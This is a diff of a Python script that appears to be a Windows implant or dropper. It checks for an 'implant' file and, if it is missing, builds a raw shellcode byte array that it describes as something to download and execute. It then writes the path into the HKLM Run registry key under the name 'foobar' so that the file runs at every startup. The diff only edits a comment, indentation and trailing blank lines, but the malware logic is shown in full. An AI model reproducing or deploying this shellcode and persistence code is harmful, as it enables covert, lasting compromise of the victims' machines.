@@ -20,9 +20,9 @@ PATH = "C:\\SomeDir\\example\\implant"
 if os.path.isfile(PATH) and os.access(PATH, os.R_OK):
     break
 else:
-	# Download file to path and execute (shellcode)
+	# Download file to path and execute (shellcode example)
 	shellcode = bytearray(
-        "\xdb\xc3\xd9\x74\x24\xf4\xbe\xe8\x5a\x27\x13\x5f\x31\xc9" 
+    "\xdb\xc3\xd9\x74\x24\xf4\xbe\xe8\x5a\x27\x13\x5f\x31\xc9" 
 	"\xb1\x33\x31\x77\x17\x83\xc7\x04\x03\x9f\x49\xc5\xe6\xa3" 
 	"\x86\x80\x09\x5b\x57\xf3\x80\xbe\x66\x21\xf6\xcb\xdb\xf5" 
 	"\x7c\x99\xd7\x7e\xd0\x09\x63\xf2\xfd\x3e\xc4\xb9\xdb\x71" 
@@ -64,3 +64,5 @@ else:
 	PATH_TO_YOUR_EXECUTABLE = PATH
 	node = _winreg.OpenKey(_winreg.HKEY_LOCAL_MACHINE, 'Software\\Microsoft\\Windows\\CurrentVersion\\Run', 0, _winreg.KEY_ALL_ACCESS)
 	_winreg.SetValueEx(node, 'foobar', 0, _winreg.REG_SZ, PATH_TO_YOUR_EXECUTABLE)
+	
+	
